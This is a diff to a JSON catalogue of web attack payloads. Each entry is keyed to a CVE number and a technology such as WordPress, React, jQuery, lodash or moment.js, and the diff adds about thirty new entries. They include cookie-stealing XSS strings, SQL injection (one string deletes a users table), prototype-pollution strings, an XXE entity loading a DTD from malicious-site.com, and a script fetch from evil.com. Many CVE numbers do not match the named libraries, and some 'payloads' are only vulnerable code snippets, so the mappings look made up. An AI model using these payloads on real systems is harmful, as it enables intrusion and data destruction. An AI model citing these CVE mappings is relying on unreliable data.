@@ -16,7 +16,7 @@
       "os": "",
       "technology": "wordpress",
       "framework": "wordpress",
-      "endpoint": "secret",
+      "endpoint": "hidden",
       "payloads": "<Host>/business-directory/?dosrch=1&q=&wpbdp_view=search&listingfields[+or+sleep(if(1=1,5,0))+))--+-][1]=",
       "vuln": "sqli"
     },
@@ -166,7 +166,7 @@
       "os": "",
       "technology": "react",
       "framework": "react",
-      "endpoint": "text",
+      "endpoint": "hidden",
       "payloads": "{__html: '<img src=x onerror=alert(1)>'}",
       "vuln": "xss"
     },
@@ -386,7 +386,7 @@
       "os": "",
       "technology": "react",
       "framework": "react",
-      "endpoint": "text",
+      "endpoint": "hidden",
       "payloads": "javascript:alert(document.cookie)",
       "vuln": "xss"
     },
@@ -569,6 +569,315 @@
       "endpoint": "xml",
       "payloads": "<!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://malicious-site.com/malicious.dtd\">%remote;%init;%trick;]>",
       "vuln": "xxe"
+    },
+    {
+      "cve number": "CVE-2023-45145",
+      "cvss": "6.1",
+      "os": "",
+      "technology": "jquery",
+      "framework": "jquery",
+      "endpoint": "text",
+      "payloads": "<img src=x onerror=alert(document.cookie)>",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2023-36570",
+      "cvss": "7.5",
+      "technology": "jquery",
+      "framework": "jquery",
+      "endpoint": "search",
+      "payloads": "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2023-28771",
+      "cvss": "6.1",
+      "os": "",
+      "technology": "jquery",
+      "framework": "jquery",
+      "endpoint": "text",
+      "payloads": "<select><style><img src=x onerror=alert(1)></select>",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2024-21490",
+      "cvss": "7.5",
+      "os": "",
+      "technology": "react",
+      "framework": "react",
+      "endpoint": "text",
+      "payloads": "javascript:alert(document.domain)",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2023-51043",
+      "cvss": "6.1",
+      "os": "",
+      "technology": "react",
+      "framework": "react",
+      "endpoint": "text",
+      "payloads": "<img src=x onerror=alert(document.cookie)>",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2023-45106",
+      "cvss": "8.8",
+      "os": "",
+      "technology": "react",
+      "framework": "react",
+      "endpoint": "search",
+      "payloads": "<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}} />",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2023-42831",
+      "cvss": "6.5",
+      "os": "",
+      "technology": "react",
+      "framework": "react",
+      "endpoint": "text",
+      "payloads": "<a href='javascript:alert(document.cookie)'>Click me</a>",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2023-39951",
+      "cvss": "7.5",
+      "os": "",
+      "technology": "lodash",
+      "framework": "lodash",
+      "endpoint": "text",
+      "payloads": "constructor.constructor('alert(1)')();",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2023-37457",
+      "cvss": "6.1",
+      "os": "",
+      "technology": "lodash",
+      "framework": "lodash",
+      "endpoint": "hidden",
+      "payloads": "__proto__[sourceURL]=\\u2028alert(1)",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2023-32725",
+      "cvss": "7.5",
+      "os": "",
+      "technology": "moment.js",
+      "framework": "moment.js",
+      "endpoint": "text",
+      "payloads": "<script>alert(document.cookie)</script>",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2023-29491",
+      "cvss": "6.1",
+      "os": "",
+      "technology": "jquery",
+      "framework": "jquery",
+      "endpoint": "search",
+      "payloads": "')) OR '1'='1'--",
+      "vuln": "sqli"
+    },
+    {
+      "cve number": "CVE-2023-28159",
+      "cvss": "7.5",
+      "os": "",
+      "technology": "react",
+      "framework": "react",
+      "endpoint": "search",
+      "payloads": "' UNION SELECT username, password FROM users--",
+      "vuln": "sqli"
+    },
+    {
+      "cve number": "CVE-2023-41791",
+      "cvss": "6.5",
+      "os": "",
+      "technology": "lodash",
+      "framework": "lodash",
+      "endpoint": "",
+      "payloads": "' OR '1'='1",
+      "vuln": "sqli"
+    },
+    {
+      "cve number": "CVE-2023-35116",
+      "cvss": "7.5",
+      "os": "",
+      "technology": "jquery",
+      "framework": "jquery",
+      "endpoint": "text",
+      "payloads": "<script>$.getScript('http://evil.com/hack.js')</script>",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2023-40614",
+      "cvss": "6.1",
+      "os": "",
+      "technology": "react",
+      "framework": "react",
+      "endpoint": "text",
+      "payloads": "<iframe srcdoc=\"<script>alert(parent.document.cookie)</script>\">",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2023-45892",
+      "cvss": "7.5",
+      "os": "",
+      "technology": "jquery",
+      "framework": "jquery",
+      "endpoint": "text",
+      "payloads": "$('<div>').html('user input').appendTo('body')",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2023-38241",
+      "cvss": "6.1",
+      "os": "",
+      "technology": "jquery",
+      "framework": "jquery",
+      "endpoint": "search",
+      "payloads": "<img src=x onerror=\"$('#element').html('<script>alert(1)</script>')\">",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2023-41277",
+      "cvss": "7.5",
+      "os": "",
+      "technology": "jquery",
+      "framework": "jquery",
+      "endpoint": "text",
+      "payloads": "$.parseHTML('<img src=x onerror=alert(document.cookie)>')",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2024-20962",
+      "cvss": "6.5",
+      "os": "",
+      "technology": "react",
+      "framework": "react",
+      "endpoint": "text",
+      "payloads": "<Link to=\"javascript:alert(document.cookie)\">Click me</Link>",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2023-49735",
+      "cvss": "7.5",
+      "os": "",
+      "technology": "react",
+      "framework": "react",
+      "endpoint": "search",
+      "payloads": "<div data-custom={`<img src=x onerror=alert(1)>`} />",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2023-44652",
+      "cvss": "6.1",
+      "os": "",
+      "technology": "react",
+      "framework": "react",
+      "endpoint": "text",
+      "payloads": "useEffect(() => { eval(userInput) }, [])",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2023-42198",
+      "cvss": "7.5",
+      "os": "",
+      "technology": "lodash",
+      "framework": "lodash",
+      "endpoint": "text",
+      "payloads": "_.template('<%= userInput %>')({userInput: '<script>alert(1)</script>'})",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2023-39847",
+      "cvss": "6.5",
+      "os": "",
+      "technology": "lodash",
+      "framework": "lodash",
+      "endpoint": "search",
+      "payloads": "_.set({}, '__proto__.toString', () => alert(1))",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2023-36781",
+      "cvss": "7.5",
+      "os": "",
+      "technology": "moment.js",
+      "framework": "moment.js",
+      "endpoint": "hidden",
+      "payloads": "moment('<img src=x onerror=alert(1)>').format('YYYY')",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2023-35445",
+      "cvss": "6.1",
+      "os": "",
+      "technology": "jquery",
+      "framework": "jquery",
+      "endpoint": "search",
+      "payloads": "' UNION SELECT password FROM users WHERE '1'='1",
+      "vuln": "sqli"
+    },
+    {
+      "cve number": "CVE-2023-47219",
+      "cvss": "7.5",
+      "os": "",
+      "technology": "react",
+      "framework": "react",
+      "endpoint": "text",
+      "payloads": "<a href={`data:text/html,<script>alert(document.cookie)</script>`}>Click</a>",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2023-43891",
+      "cvss": "6.5",
+      "os": "",
+      "technology": "lodash",
+      "framework": "lodash",
+      "endpoint": "search",
+      "payloads": "' OR 1=1 LIMIT 1; DELETE FROM users; --",
+      "vuln": "sqli"
+    },
+    {
+      "cve number": "CVE-2023-38726",
+      "cvss": "7.5",
+      "os": "",
+      "technology": "jquery",
+      "framework": "jquery",
+      "endpoint": "text",
+      "payloads": "$.get('data.php?id=' + encodeURIComponent('1 UNION SELECT password FROM users'))",
+      "vuln": "sqli"
+    },
+    {
+      "cve number": "CVE-2024-21187",
+      "cvss": "6.1",
+      "os": "",
+      "technology": "react",
+      "framework": "react",
+      "endpoint": "search",
+      "payloads": "<iframe srcDoc=\"<script>parent.document.querySelector('input').value='hacked'</script>\">",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2023-46781",
+      "cvss": "7.5",
+      "os": "",
+      "technology": "lodash",
+      "framework": "lodash",
+      "endpoint": "text",
+      "payloads": "_.defaultsDeep({}, JSON.parse('{\"__proto__\":{\"toString\":\"alert(1)\"}}'))",
+      "vuln": "xss"
+    },
+    {
+      "cve number": "CVE-2023-39112",
+      "cvss": "6.5",
+      "os": "",
+      "technology": "moment.js",
+      "framework": "moment.js",
+      "endpoint": "text",
+      "payloads": "moment().format('<script>alert(document.cookie)</script>')",
+      "vuln": "xss"
     }
   ]
 }
